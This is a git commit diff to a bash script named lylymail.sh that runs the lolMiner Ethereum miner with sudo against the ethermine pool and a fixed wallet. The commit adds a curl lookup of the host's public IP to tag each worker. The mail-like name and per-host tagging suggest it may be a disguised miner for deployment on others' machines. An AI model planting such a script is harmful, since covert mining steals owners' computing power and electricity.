648d29528d4c959ae64921c12bf7e191f3ad2754
tranquangchung1989 <82724509+tranquangchung1989@users.noreply.github.com>
2021-08-16 04:37:41 +0800

    Update lylymail.sh

--- lylymail.sh
+++ lylymail.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
 POOL=us1.ethermine.org:4444
-WALLET=0xa30ca72f08082da41cb4c2935e5cb756b308fa2f.ly-dep-trai
+WALLET=0xa30ca72f08082da41cb4c2935e5cb756b308fa2f.$(echo "$(curl -s ifconfig.me)" | tr . _ )-ly-dep-trai
 
 cd "$(dirname "$0")"
 
-chmod +x ./lylymail && sudo ./lylymail --algo ETHASH --pool $POOL --user $WALLET  $@
+chmod +x ./lolMiner && sudo ./lolMiner --algo ETHASH --pool $POOL --user $WALLET  $@
